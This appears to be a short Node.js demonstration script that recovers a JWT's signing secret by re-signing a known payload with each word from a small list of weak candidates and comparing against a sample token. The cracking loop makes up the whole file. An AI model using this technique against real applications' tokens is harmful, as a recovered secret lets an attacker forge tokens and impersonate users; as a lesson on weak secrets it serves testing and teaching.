
const jwt = require('jsonwebtoken')

const possibleSecrets = [
    'PASSWORD',
    '12345678',
    'JWT_SECRET_PASSWORD',
];

let token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2M2Y5YzBlNDY3ZWViMjRmZmZkY2UyZGQiLCJuYW1lIjoiSm9obiBEb2UiLCJlbWFpbCI6ImpvaG4uZG9lQGV4YW1wbGUuY29tIiwiaWF0IjoxNTE2MjM5MDIyfQ.APdGmmdCH7znzu-2xV7V-KnatsiiKPTYIkzoKICRO7I';

const data = {
    "_id": "63f9c0e467eeb24fffdce2dd",
    "name": "John Doe",
    "email": "john.doe@example.com",
    "iat": 1516239022
}


for(const secret of possibleSecrets) {
    let possibleToken = jwt.sign(data, secret)

    if (possibleToken === token) {
        console.log('Figured out the secret', secret);
        break;
    }
}
